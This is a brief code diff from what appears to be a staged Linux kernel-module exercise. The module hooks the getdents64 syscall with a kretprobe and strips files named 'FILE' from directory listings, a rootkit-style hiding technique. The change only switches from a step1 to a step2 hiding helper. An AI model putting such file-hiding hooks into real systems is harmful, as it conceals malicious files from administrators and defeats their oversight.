@@ -23,7 +23,7 @@
 #include <linux/if_arp.h>
 
 #include "helpers.h"
-#include "step1.h"
+#include "step2.h"
 #include "step3.h"
 
 static char* hide_file_name = "FILE";
@@ -84,7 +84,7 @@ static int getents64_handle_return(struct kretprobe_instance *ri, struct pt_regs
         return 0;
 
     // hide by name
-    unsigned long new_size_after_hide_file = step1_hide_file_by_name(args->buffer_ptr, buffer_count, hide_file_name);
+    unsigned long new_size_after_hide_file = step2_hide_file_by_name(args->buffer_ptr, buffer_count, hide_file_name);
     regs_set_return_value(regs, new_size_after_hide_file);
 
     //pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
